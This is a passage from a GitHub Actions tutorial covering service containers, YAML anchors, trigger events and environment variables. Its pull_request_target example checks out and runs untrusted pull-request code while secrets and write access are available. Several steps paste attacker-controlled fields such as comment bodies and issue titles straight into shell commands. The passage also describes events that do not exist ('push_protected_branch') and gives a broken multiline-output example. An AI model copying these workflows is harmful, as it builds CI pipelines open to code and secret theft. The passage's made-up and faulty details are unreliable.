| `image`       | Docker image for the container                         |
| `env`         | Environment variables for the container                |
| `ports`       | Port mappings to expose (`host:container`)             |
| `options`     | Docker `--option` flags (health checks, volumes, etc.) |
| `credentials` | Credentials for private container registries           |
| `volumes`     | Volume mounts                                          |

**Single Service (PostgreSQL):**

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_DB: testdb
          POSTGRES_USER: testuser
          POSTGRES_PASSWORD: testpassword
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5
    steps:
      - uses: actions/checkout@v3
      - name: Run Tests Against PostgreSQL
        run: npm test
        env:
          DATABASE_URL: postgresql://testuser:testpassword@localhost:5432/testdb
```

**Multiple Services (Database + Redis):**

```yaml
jobs:
  integration-test:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: secret
        ports:
          - 5432:5432
        options: >-
          --health-cmd pg_isready
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

      redis:
        image: redis:7
        ports:
          - 6379:6379
        options: >-
          --health-cmd "redis-cli ping"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 5

      rabbitmq:
        image: rabbitmq:3-management
        env:
          RABBITMQ_DEFAULT_USER: user
          RABBITMQ_DEFAULT_PASS: password
        ports:
          - 5672:5672
          - 15672:15672
    steps:
      - uses: actions/checkout@v3
      - name: Wait for services to be ready
        run: |
          # Services health checks handle readiness automatically
          echo "All services ready"
      - name: Run Integration Tests
        run: pytest tests/integration/
        env:
          DATABASE_URL: postgresql://postgres:secret@localhost:5432/postgres
          REDIS_URL: redis://localhost:6379
          AMQP_URL: amqp://user:password@localhost:5672
```

**Service Containers in Job Containers (container: + services:):**

```yaml
jobs:
  test:
    runs-on: ubuntu-latest
    # When using a job container, use service ID (not localhost) as hostname
    container:
      image: node:18
    services:
      mysql:
        image: mysql:8
        env:
          MYSQL_ROOT_PASSWORD: rootpass
          MYSQL_DATABASE: testdb
        options: >-
          --health-cmd "mysqladmin ping -h localhost"
          --health-interval 10s
          --health-timeout 5s
          --health-retries 10
        ports:
          - 3306:3306
    steps:
      - uses: actions/checkout@v3
      - name: Test with MySQL
        run: npm test
        env:
          # Use service ID as hostname when job runs in container
          DATABASE_HOST: mysql
          DATABASE_PORT: 3306
          DATABASE_NAME: testdb
          DATABASE_USER: root
          DATABASE_PASSWORD: rootpass
```

> **Note:** When your job runs directly on the runner (`runs-on` without `container:`), services are accessible via `localhost`. When your job runs inside a container (`container:`), services are accessible via the **service ID** as the hostname (e.g., `mysql`, `postgres`).

---

### 11. **permissions**

Modify the default permissions granted to the GITHUB_TOKEN.

```yaml
permissions:
  contents: read
  pages: write
  id-token: write
```

---

### 12. **YAML Anchors and Aliases**

YAML anchors (`&`) and aliases (`*`) allow you to reuse YAML content, keeping workflows DRY. GitHub Actions uses standard YAML parsing, so anchors are resolved before the workflow engine processes the file.

**Syntax:**

| Symbol      | Role                                                                           |
| ----------- | ------------------------------------------------------------------------------ |
| `&name`     | Defines an anchor called `name` at the marked node                             |
| `*name`     | References (aliases) the anchor — replaces the alias with the anchored content |
| `<<: *name` | Merge key — merges the anchor's mapping into the current mapping               |

**Basic anchor and alias:**

```yaml
# Shared environment block
x-common-env: &common-env
  NODE_ENV: production
  LOG_LEVEL: info
  REGION: us-east-1

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      <<: *common-env # merges NODE_ENV, LOG_LEVEL, REGION into this job
      APP_VERSION: "2.1.0"
    steps:
      - run: echo "Building $NODE_ENV app"

  deploy:
    runs-on: ubuntu-latest
    env:
      <<: *common-env # same shared env
      DEPLOY_TARGET: production
    steps:
      - run: echo "Deploying to $REGION"
```

**Reusing step definitions:**

```yaml
x-checkout-step: &checkout
  name: Checkout code
  uses: actions/checkout@v4
  with:
    fetch-depth: 0

x-setup-node: &setup-node
  name: Set up Node.js
  uses: actions/setup-node@v4
  with:
    node-version: "20"
    cache: "npm"

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - <<: *checkout
      - <<: *setup-node
      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    steps:
      - <<: *checkout
      - <<: *setup-node
      - run: npm test
```

**Anchors in matrix strategy:**

```yaml
x-default-strategy: &default-strategy
  fail-fast: false
  max-parallel: 3

jobs:
  unit-tests:
    strategy:
      <<: *default-strategy
      matrix:
        node: [18, 20]
    runs-on: ubuntu-latest
    steps:
      - run: node --version

  integration-tests:
    strategy:
      <<: *default-strategy
      matrix:
        db: [postgres, mysql]
    runs-on: ubuntu-latest
    steps:
      - run: echo "Testing with ${{ matrix.db }}"
```

**Important notes:**

- Top-level YAML keys beginning with `x-` are ignored by GitHub Actions — use them as a convention for anchor definitions to avoid validation errors
- Anchors are resolved by the YAML parser; the **workflow logs show the resolved values**, not anchor names
- Anchors cannot span across files — they only work within the same `.yml` file
- The `<<` merge key merges all key–value pairs from the referenced mapping; existing keys in the current mapping take precedence

**Reading and interpreting YAML anchors (consumer perspective):**

When reviewing a workflow that uses anchors, mentally expand `<<: *anchor-name` by substituting the anchor's key–value pairs into the current mapping. Keys already defined in the current block override those from the anchor.

```yaml
# Before anchor expansion (what you read in the source file)
x-common-env: &common-env
  NODE_ENV: production
  LOG_LEVEL: info

jobs:
  build:
    env:
      <<: *common-env    # ← expands to NODE_ENV + LOG_LEVEL
      APP_VERSION: "2.1.0"

# After anchor expansion (what the runner actually sees)
jobs:
  build:
    env:
      NODE_ENV: production    # from anchor
      LOG_LEVEL: info         # from anchor
      APP_VERSION: "2.1.0"   # defined locally, not overridden
```

The **workflow run logs** always show the fully resolved values — you will never see `*common-env` or `<<:` in the expanded YAML that GitHub Actions processes. This means:

- Log output and GitHub's workflow visualization show concrete values, not anchor names
- If a local key conflicts with an anchor key, the **local key wins** (anchors cannot override explicit values)
- If you see unexpected environment variables in a workflow, check anchor definitions at the top (`x-` prefixed keys) of the file

---

### 13. **Complete Workflow Example**

```yaml
name: Full CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  schedule:
    - cron: "0 2 * * *"

env:
  NODE_ENV: production
  REGISTRY: ghcr.io

defaults:
  run:
    shell: bash

permissions:
  contents: read
  packages: write

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 18
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Run linter
        run: npm run lint

  test:
    runs-on: ubuntu-latest
    needs: lint
    strategy:
      matrix:
        node-version: [16, 18, 20]
    steps:
      - uses: actions/checkout@v3

      - name: Setup Node.js ${{ matrix.node-version }}
        uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.node-version }}
          cache: npm

      - name: Install dependencies
        run: npm ci

      - name: Run tests
        run: npm test
        env:
          CI: true

  build:
    runs-on: ubuntu-latest
    needs: test
    outputs:
      image-tag: ${{ steps.meta.outputs.tags }}
    steps:
      - uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Generate image metadata
        id: meta
        uses: docker/metadata-action@v4
        with:
          images: ${{ env.REGISTRY }}/myapp
          tags: |
            type=ref,event=branch
            type=sha,prefix={{branch}}-
            type=semver,pattern={{version}}

      - name: Build Docker image
        uses: docker/build-push-action@v4
        with:
          context: .
          push: false
          tags: ${{ steps.meta.outputs.tags }}
          labels: ${{ steps.meta.outputs.labels }}

  deploy:
    if: github.ref == 'refs/heads/main' && github.event_name == 'push'
    runs-on: ubuntu-latest
    needs: build
    environment: production
    steps:
      - uses: actions/checkout@v3

      - name: Deploy to production
        run: |
          echo "Deploying to production..."
          echo "Build tag: ${{ needs.build.outputs.image-tag }}"
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

---

## GitHub Workflow Trigger Events

GitHub provides numerous trigger events that determine when a workflow runs. Understanding all available trigger events allows you to create powerful automation tailored to your specific needs. This section comprehensively documents every trigger event available in GitHub Actions.

### Overview of Trigger Events

Trigger events fall into several categories:

- **Repository Events**: Triggered by changes in the repository (push, pull requests, etc.)
- **External Events**: Triggered by external systems (webhook events, repository dispatch)
- **Time-Based Events**: Triggered on a schedule (cron jobs)
- **Manual Events**: Triggered by user action (workflow dispatch)
- **Workflow Events**: Triggered by other workflows

### 1. **push** - Code Push Event

Triggers when code is pushed to the repository.

```yaml
on: push

# Trigger on specific branches
on:
  push:
    branches:
      - main
      - develop
      - 'release/**'  # Wildcard pattern

# Trigger on specific tags
on:
  push:
    tags:
      - 'v*'  # All versions like v1.0, v2.1.0, etc.
      - 'release-*'

# Trigger on specific file changes (paths)
on:
  push:
    paths:
      - 'src/**'
      - 'package.json'
      - '.github/workflows/**'

# Ignore specific paths
on:
  push:
    paths-ignore:
      - '*.md'
      - 'docs/**'
      - '.gitignore'

# Combine multiple conditions
on:
  push:
    branches: [main]
    paths: ['src/**', 'package.json']
```

#### Practical Example

```yaml
name: Push Event Handler

on:
  push:
    branches: [main, develop]
    paths: ["src/**", "package.json"]

jobs:
  on-push:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: echo "Code pushed to ${{ github.ref_name }}"
```

---

### 2. **pull_request** - Pull Request Event

Triggers when pull request events occur (opened, reopened, synchronized, etc.).

```yaml
on: pull_request

# Trigger on specific branches
on:
  pull_request:
    branches: [main, develop]

# Trigger on pull requests that modify specific paths
on:
  pull_request:
    paths:
      - '**/*.js'
      - 'package.json'

# Specific PR actions
on:
  pull_request:
    types:
      - opened
      - reopened
      - synchronize
      - ready_for_review
      - converted_to_draft

# Ignore drafts
on:
  pull_request:
    paths-ignore: ['*.md']
```

#### PR Event Types

| Type                     | Description                      |
| ------------------------ | -------------------------------- |
| `opened`                 | Pull request created             |
| `reopened`               | Previously closed PR reopened    |
| `synchronize`            | PR commits added (code changed)  |
| `converted_to_draft`     | PR converted to draft            |
| `ready_for_review`       | Draft PR marked ready for review |
| `labeled`                | Label added to PR                |
| `unlabeled`              | Label removed from PR            |
| `assigned`               | Assignee added                   |
| `unassigned`             | Assignee removed                 |
| `edited`                 | PR title/description edited      |
| `auto_merge_enabled`     | Auto-merge enabled               |
| `auto_merge_disabled`    | Auto-merge disabled              |
| `closed`                 | PR closed                        |
| `locked`                 | PR locked                        |
| `unlocked`               | PR unlocked                      |
| `review_requested`       | Review requested                 |
| `review_request_removed` | Review request removed           |

#### Practical Example — Pull Request Checks

```yaml
name: Pull Request Checks

on:
  pull_request:
    types: [opened, synchronize, ready_for_review]

jobs:
  checks:
    if: github.event.pull_request.draft == false
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm test
      - run: npm run lint
```

---

### 3. **pull_request_target** - PR Target Event

Similar to `pull_request` but with access to secrets and full write permissions. Use with caution for external contributions.

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  review:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
```

---

### 4. **workflow_dispatch** - Manual Trigger

Manual trigger via GitHub UI or API.

```yaml
on:
  workflow_dispatch:
    inputs:
      environment:
        description: "Deployment environment"
        required: true
        type: choice
        options:
          - development
          - staging
          - production
      version:
        description: "Version to deploy"
        required: false
        type: string
      dry_run:
        description: "Run as dry-run"
        required: false
        type: boolean
        default: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Deploying to ${{ inputs.environment }}"
          echo "Version: ${{ inputs.version }}"
          echo "Dry Run: ${{ inputs.dry_run }}"
```

#### Input Types

| Type          | Description        | Example               |
| ------------- | ------------------ | --------------------- |
| `string`      | Text input         | `version: "1.0.0"`    |
| `choice`      | Dropdown selection | Environment selection |
| `boolean`     | Checkbox           | `true` or `false`     |
| `number`      | Numeric input      | `timeout: 30`         |
| `environment` | Select environment | Production, staging   |

---

### 5. **schedule** - Scheduled Events (Cron)

Trigger workflows on a schedule using cron syntax.

```yaml
on:
  schedule:
    # Run every day at midnight UTC
    - cron: "0 0 * * *"

    # Run every 6 hours
    - cron: "0 */6 * * *"

    # Run at 8 AM Monday-Friday
    - cron: "0 8 * * 1-5"

    # Run first day of month at 2 AM
    - cron: "0 2 1 * *"

jobs:
  scheduled-job:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Running scheduled workflow"
```

#### Cron Syntax Reference

```text
┌───────────── minute (0 - 59)
│ ┌───────────── hour (0 - 23)
│ │ ┌───────────── day of month (1 - 31)
│ │ │ ┌───────────── month (1 - 12)
│ │ │ │ ┌───────────── day of week (0 - 6) (0 = Sunday)
│ │ │ │ │
│ │ │ │ │
* * * * *
```

#### Common Cron Patterns

| Pattern        | Description                |
| -------------- | -------------------------- |
| `0 0 * * *`    | Daily at midnight UTC      |
| `0 */6 * * *`  | Every 6 hours              |
| `0 8 * * 1-5`  | 8 AM Monday-Friday         |
| `0 2 1 * *`    | First day of month at 2 AM |
| `*/30 * * * *` | Every 30 minutes           |
| `0 9 * * MON`  | Every Monday at 9 AM       |
| `0 0 * * 0`    | Every Sunday at midnight   |

---

### 6. **workflow_run** - Trigger on Another Workflow

Triggers based on another workflow's completion.

```yaml
on:
  workflow_run:
    workflows: ["Deploy"] # Workflow name or file path
    types:
      - completed
      - requested

jobs:
  follow-up:
    runs-on: ubuntu-latest
    if: github.event.workflow_run.conclusion == 'success'
    steps:
      - run: echo "Previous workflow completed successfully"
```

#### Workflow Run Types

| Type        | Description               |
| ----------- | ------------------------- |
| `completed` | Workflow run finished     |
| `requested` | Workflow requested to run |

---

### 7. **release** - Release Events

Trigger when releases are created, edited, or deleted.

```yaml
on:
  release:
    types:
      - published
      - created
      - edited
      - deleted
      - prereleased
      - released

jobs:
  on-release:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Release: ${{ github.event.release.tag_name }}"
          echo "Name: ${{ github.event.release.name }}"
```

#### Release Types

| Type          | Description                                               |
| ------------- | --------------------------------------------------------- |
| `published`   | Release published (including pre-releases when published) |
| `unpublished` | Release unpublished                                       |
| `created`     | Release created (or a pre-release published)              |
| `edited`      | Release edited                                            |
| `deleted`     | Release deleted                                           |
| `prereleased` | Marked as pre-release                                     |
| `released`    | Released (after being pre-release)                        |

---

### 8. **issues** - Issue Events

Trigger on issue activity.

```yaml
on:
  issues:
    types:
      - opened
      - closed
      - reopened
      - assigned
      - labeled
      - milestoned

jobs:
  on-issue:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Issue: ${{ github.event.issue.title }}"
          echo "Action: ${{ github.event.action }}"
```

#### Issue Types

| Type           | Description       |
| -------------- | ----------------- |
| `opened`       | Issue created     |
| `closed`       | Issue closed      |
| `reopened`     | Issue reopened    |
| `assigned`     | Assignee added    |
| `unassigned`   | Assignee removed  |
| `labeled`      | Label added       |
| `unlabeled`    | Label removed     |
| `milestoned`   | Milestone added   |
| `demilestoned` | Milestone removed |
| `transferred`  | Issue transferred |
| `pinned`       | Issue pinned      |
| `unpinned`     | Issue unpinned    |
| `deleted`      | Issue deleted     |

---

### 9. **issue_comment** - Issue Comment Events

Trigger when comments are added/edited on issues or PRs.

```yaml
on:
  issue_comment:
    types: [created, edited, deleted]

jobs:
  on-comment:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Comment: ${{ github.event.comment.body }}"
```

---

### 10. **discussion** - Discussion Events

Trigger on discussion activity (private beta).

```yaml
on:
  discussion:
    types:
      - created
      - edited
      - deleted
      - transferred
      - pinned
      - unpinned
      - labeled
      - unlabeled
      - answered
      - unanswered

jobs:
  on-discussion:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Discussion: ${{ github.event.discussion.title }}"
```

---

### 11. **discussion_comment** - Discussion Comment Events

Trigger on discussion comments.

```yaml
on:
  discussion_comment:
    types: [created, edited, deleted]

jobs:
  on-discussion-comment:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Added comment to discussion"
```

---

### 12. **fork** - Repository Fork Event

Trigger when repository is forked.

```yaml
on: fork

jobs:
  on-fork:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Repository was forked"
```

---

### 13. **gollum** - Wiki Changes

Trigger when wiki pages are created or updated.

```yaml
on: gollum

jobs:
  on-wiki-change:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Wiki updated"
```

---

### 14. **watch** - Star/Watch Event

Trigger when repository is starred.

```yaml
on: watch

jobs:
  on-star:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Repository was starred"
```

---

### 15. **create** - Branch/Tag Creation

Trigger when branch or tag is created.

```yaml
on: create

jobs:
  on-create:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Ref: ${{ github.event.ref }}"
          echo "Ref Type: ${{ github.event.ref_type }}"
```

---

### 16. **delete** - Branch/Tag Deletion

Trigger when branch or tag is deleted.

```yaml
on: delete

jobs:
  on-delete:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Branch/tag ${{ github.event.ref }} deleted"
```

---

### 17. **public** - Repository Public Event

Trigger when repository becomes public.

```yaml
on: public

jobs:
  on-public:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Repository is now public"
```

---

### 18. **push to protected branch** - Protected Branch Push

Automatic event when pushing to a branch with branch protection rules.

```yaml
on:
  push:
    branches: [main] # Main is typically protected

jobs:
  protected-push:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Protected branch updated"
```

---

### 19. **repository_dispatch** - External Trigger via API

Trigger from external systems via GitHub API.

```yaml
on:
  repository_dispatch:
    types: [deploy-prod, run-tests, custom-event]

jobs:
  on-dispatch:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Event type: ${{ github.event.action }}"
          echo "Payload: ${{ toJson(github.event.client_payload) }}"
```

**Trigger via API:**

```bash
curl -X POST https://api.github.com/repos/owner/repo/dispatches \
  -H "Authorization: token YOUR_TOKEN" \
  -H "Accept: application/vnd.github.everest-preview+json" \
  -d '{
    "event_type": "deploy-prod",
    "client_payload": { "branch": "main" }
  }'
```

---

### 20. **check_run** - Check Run Events

Trigger when check run is created or updated.

```yaml
on:
  check_run:
    types: [created, rerequested, completed, requested_action]

jobs:
  on-check-run:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Check run event"
```

---

### 21. **check_suite** - Check Suite Events

Trigger when check suite is created or updated.

```yaml
on:
  check_suite:
    types: [completed]

jobs:
  on-check-suite:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Check suite completed"
```

---

### 22. **pull_request_review** - PR Review Events

Trigger on pull request review actions.

```yaml
on:
  pull_request_review:
    types:
      - submitted
      - edited
      - dismissed

jobs:
  on-review:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Review state: ${{ github.event.review.state }}"
```

---

### 23. **pull_request_review_comment** - PR Review Comment Events

Trigger on comments in pull request reviews.

```yaml
on:
  pull_request_review_comment:
    types: [created, edited, deleted]

jobs:
  on-review-comment:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Review comment added"
```

---

### 24. **member** - Collaborator Events

Trigger when collaborator added to repository.

```yaml
on: member

jobs:
  on-member-add:
    runs-on: ubuntu-latest
    steps:
      - run: echo "New collaborator added"
```

---

### 25. **team_add** - Team Added Event

Trigger when team is added to repository.

```yaml
on: team_add

jobs:
  on-team-add:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Team added to repository"
```

---

### 26. **push_protected_branch** - Protected Branch Push

Automatic trigger for protected branch updates.

```yaml
on:
  push:
    branches:
      - main
      - master
```

---

### Complete Example: All Event Types

```yaml
name: Comprehensive Trigger Events Example

on:
  # Repository events
  push:
    branches: [main]
    paths: ["src/**"]
  pull_request:
    types: [opened, synchronize]
  release:
    types: [published]
  issues:
    types: [opened, labeled]
  issue_comment:
    types: [created]
  discussion:
    types: [created]
  fork: {}
  create: {}
  delete: {}
  public: {}

  # Scheduled events
  schedule:
    - cron: "0 0 * * *"

  # Manual trigger
  workflow_dispatch:
    inputs:
      debug:
        type: boolean
        default: false

jobs:
  handle-events:
    runs-on: ubuntu-latest
    steps:
      - name: Identify Event
        run: |
          echo "Event Name: ${{ github.event_name }}"
          echo "Action: ${{ github.event.action }}"
          case "${{ github.event_name }}" in
            push)
              echo "Code was pushed"
              ;;
            pull_request)
              echo "Pull request: ${{ github.event.action }}"
              ;;
            release)
              echo "Release: ${{ github.event.release.tag_name }}"
              ;;
            issues)
              echo "Issue: ${{ github.event.issue.title }}"
              ;;
            schedule)
              echo "Scheduled run"
              ;;
            workflow_dispatch)
              echo "Manual trigger - Debug: ${{ inputs.debug }}"
              ;;
          esac
```

### Event Availability Summary

| Event                 | When Triggered     | Secret Access | Write Permissions |
| --------------------- | ------------------ | ------------- | ----------------- |
| `push`                | Code push          | ✓             | ✓                 |
| `pull_request`        | PR activity        | Limited       | Limited           |
| `workflow_dispatch`   | Manual             | ✓             | ✓                 |
| `schedule`            | Cron schedule      | ✓             | ✓                 |
| `release`             | Release published  | ✓             | ✓                 |
| `issues`              | Issue activity     | ✓             | ✓                 |
| `issue_comment`       | Comments           | ✓             | ✓                 |
| `workflow_run`        | Workflow completes | ✓             | ✓                 |
| `repository_dispatch` | API call           | ✓             | ✓                 |
| `fork`                | Repository forked  | Limited       | Limited           |

---

## Creating and Using Custom Environment Variables

Environment variables are a fundamental way to configure workflows dynamically, pass information between steps, and securely manage sensitive data. This section covers the various ways to create, use, and manage custom environment variables in GitHub workflows.

### 1. **Workflow-Level Environment Variables**

Workflow-level environment variables are defined at the top of your workflow file and are available to all jobs and steps.

#### Definition and Usage

```yaml
name: Workflow with Global Env Vars

on: [push]

env:
  NODE_ENV: production
  LOG_LEVEL: debug
  REGISTRY: ghcr.io
  IMAGE_NAME: myapp

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Print environment variables
        run: |
          echo "Environment: $NODE_ENV"
          echo "Log Level: $LOG_LEVEL"
          echo "Registry: $REGISTRY/$IMAGE_NAME"
```

#### With Context Variables

You can use contexts and expressions when defining workflow-level environment variables:

```yaml
env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}
  WORKFLOW_NAME: ${{ github.workflow }}
  RUN_ID: ${{ github.run_id }}
```

### 2. **Job-Level Environment Variables**

Environment variables can be scoped to a specific job, making them available to all steps within that job.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      DEPLOY_REGION: us-east-1
      ENVIRONMENT: staging
    steps:
      - name: Deploy application
        run: |
          echo "Deploying to $DEPLOY_REGION"
          echo "Environment: $ENVIRONMENT"
```

#### Job-Level Override of Workflow-Level Variables

```yaml
env:
  ENVIRONMENT: production

jobs:
  test:
    runs-on: ubuntu-latest
    env:
      ENVIRONMENT: development  # Overrides workflow-level
    steps:
      - run: echo "Test environment: $ENVIRONMENT"  # Prints "development"

  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "Deploy environment: $ENVIRONMENT"  # Prints "production"
```

### 3. **Step-Level Environment Variables**

Environment variables can be defined for individual steps, providing the most granular control.

```yaml
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Build step
        env:
          BUILD_TYPE: release
          OPTIMIZATION_LEVEL: 3
        run: |
          echo "Build Type: $BUILD_TYPE"
          echo "Optimization Level: $OPTIMIZATION_LEVEL"

      - name: Test step
        env:
          TEST_ENV: staging
        run: |
          echo "Test Environment: $TEST_ENV"
          # BUILD_TYPE is not available here
```

#### Step-Level Override of All Levels

```yaml
env:
  CONFIG: default

jobs:
  test:
    runs-on: ubuntu-latest
    env:
      CONFIG: job-level
    steps:
      - name: Step with override
        env:
          CONFIG: step-level  # Most specific, takes precedence
        run: echo "Config: $CONFIG"  # Prints "step-level"

      - name: Step without override
        run: echo "Config: $CONFIG"  # Prints "job-level"
```

### 4. **Using Secrets in Environment Variables**

Secrets are a secure way to store sensitive information and can be referenced in environment variables.

```yaml
jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      API_KEY: ${{ secrets.API_KEY }}
      DATABASE_URL: ${{ secrets.DATABASE_URL }}
    steps:
      - name: Deploy with credentials
        run: ./deploy.sh
        # Secrets are automatically redacted from logs
```

#### Secret Masking and Redaction

GitHub automatically masks secret values in logs to prevent accidental exposure:

```yaml
jobs:
  secure:
    runs-on: ubuntu-latest
    steps:
      - name: Using secrets safely
        env:
          TOKEN: ${{ secrets.SECRET_TOKEN }}
        run: |
          # ✓ Safe: secret is passed to a command
          curl -H "Authorization: Bearer $TOKEN" https://api.example.com

          # ✗ Unsafe: echoing the secret (will be redacted in logs)
          echo "Token: $TOKEN"  # Logs will show: Token: ***
```

### 5. **Using Contexts and Expressions in Environment Variables**

Environment variables can reference GitHub contexts, providing dynamic configuration.

#### Using github Context

```yaml
env:
  REPO: ${{ github.repository }}
  BRANCH: ${{ github.ref_name }}
  COMMIT: ${{ github.sha }}
  WORKFLOW: ${{ github.workflow }}
  ACTOR: ${{ github.actor }}

jobs:
  info:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Repository: $REPO"
          echo "Branch: $BRANCH"
          echo "Commit: $COMMIT"
          echo "Workflow: $WORKFLOW"
          echo "Triggered by: $ACTOR"
```

#### Using runner Context

```yaml
jobs:
  debug-runner:
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, windows-latest]
    env:
      RUNNER_OS: ${{ runner.os }}
      RUNNER_ARCH: ${{ runner.arch }}
      WORKSPACE: ${{ runner.workspace }}
    steps:
      - run: |
          echo "OS: $RUNNER_OS"
          echo "Architecture: $RUNNER_ARCH"
          echo "Workspace: $WORKSPACE"
```

#### Using Matrix Context

```yaml
jobs:
  build:
    strategy:
      matrix:
        node: [16, 18, 20]
        os: [ubuntu-latest, windows-latest]
    env:
      NODE_VERSION: ${{ matrix.node }}
      BUILD_OS: ${{ matrix.os }}
      BUILD_ID: ${{ matrix.node }}-${{ matrix.os }}
    runs-on: ${{ matrix.os }}
    steps:
      - run: |
          echo "Building for Node $NODE_VERSION on $BUILD_OS"
          echo "Build ID: $BUILD_ID"
```

### 6. **Creating Dynamic Environment Variables from Step Outputs**

Environment variables for subsequent steps can be created using step outputs and the special `GITHUB_OUTPUT` file.

#### Using GITHUB_OUTPUT

```yaml
jobs:
  dynamic-vars:
    runs-on: ubuntu-latest
    steps:
      - name: Set dynamic variables
        id: vars
        run: |
          VERSION=$(cat version.txt)
          TIMESTAMP=$(date +%Y%m%d_%H%M%S)
          echo "version=$VERSION" >> $GITHUB_OUTPUT
          echo "timestamp=$TIMESTAMP" >> $GITHUB_OUTPUT
          echo "build-id=$VERSION-$TIMESTAMP" >> $GITHUB_OUTPUT

      - name: Use dynamic variables
        env:
          APP_VERSION: ${{ steps.vars.outputs.version }}
          BUILD_TIMESTAMP: ${{ steps.vars.outputs.timestamp }}
          BUILD_ID: ${{ steps.vars.outputs.build-id }}
        run: |
          echo "Version: $APP_VERSION"
          echo "Timestamp: $BUILD_TIMESTAMP"
          echo "Build ID: $BUILD_ID"
```

#### Multiline Environment Variables

```yaml
- name: Create multiline variable
  id: config
  run: |
    echo "multiline-value<<EOF" >> $GITHUB_OUTPUT
    echo "Line 1"
    echo "Line 2"
    echo "Line 3"
    echo "EOF" >> $GITHUB_OUTPUT

- name: Use multiline variable
  env:
    CONFIG: ${{ steps.config.outputs.multiline-value }}
  run: echo "$CONFIG"
```

### 7. **Using environment Variables from Previous Jobs**

Access environment variables from dependencies using the `needs` context and job outputs:

```yaml
jobs:
  setup:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.version.outputs.result }}
      build-date: ${{ steps.date.outputs.result }}
    env:
      DEFAULT_VERSION: 1.0.0
    steps:
      - id: version
        run: echo "result=$DEFAULT_VERSION" >> $GITHUB_OUTPUT

      - id: date
        run: echo "result=$(date +%Y-%m-%d)" >> $GITHUB_OUTPUT

  build:
    needs: setup
    runs-on: ubuntu-latest
    env:
      APP_VERSION: ${{ needs.setup.outputs.version }}
      BUILD_DATE: ${{ needs.setup.outputs.build-date }}
    steps:
      - run: |
          echo "Building version: $APP_VERSION"
          echo "Build date: $BUILD_DATE"
```

### 8. **Environment Variables with Default Values**

Use bash parameter expansion to provide default values:

```yaml
jobs:
  defaults:
    runs-on: ubuntu-latest
    env:
      NODE_ENV: ${{ vars.NODE_ENV || 'development' }}
      LOG_LEVEL: DEBUG
      PORT: ${{ env.PORT || 3000 }}
    steps:
      - run: |
          echo "Environment: $NODE_ENV"
          echo "Log Level: $LOG_LEVEL"
          echo "Port: $PORT"
```

#### Using Variable Expansion

```yaml
steps:
  - name: Expand variables
    env:
      OPTIONAL_CONFIG: ${{ vars.OPTIONAL_CONFIG }}
    run: |
      # Use default if empty
      CONFIG=${OPTIONAL_CONFIG:=default-value}
      echo "Configuration: $CONFIG"
```

### 9. **Special Environment Variables**

GitHub automatically provides several special environment variables:

```yaml
jobs:
  special-vars:
    runs-on: ubuntu-latest
    steps:
      - name: Show special variables
        run: |
          echo "CI: $CI"
          echo "GITHUB_WORKSPACE: $GITHUB_WORKSPACE"
          echo "GITHUB_ACTION: $GITHUB_ACTION"
          echo "GITHUB_RUN_ID: $GITHUB_RUN_ID"
          echo "GITHUB_RUN_NUMBER: $GITHUB_RUN_NUMBER"
          echo "GITHUB_REF: $GITHUB_REF"
          echo "GITHUB_SHA: $GITHUB_SHA"
          echo "GITHUB_ACTOR: $GITHUB_ACTOR"
          echo "GITHUB_REPOSITORY: $GITHUB_REPOSITORY"
          echo "RUNNER_OS: $RUNNER_OS"
          echo "RUNNER_TEMP: $RUNNER_TEMP"
```

#### Special GitHub Environment Variables

| Variable                  | Description                                                           |
| ------------------------- | --------------------------------------------------------------------- |
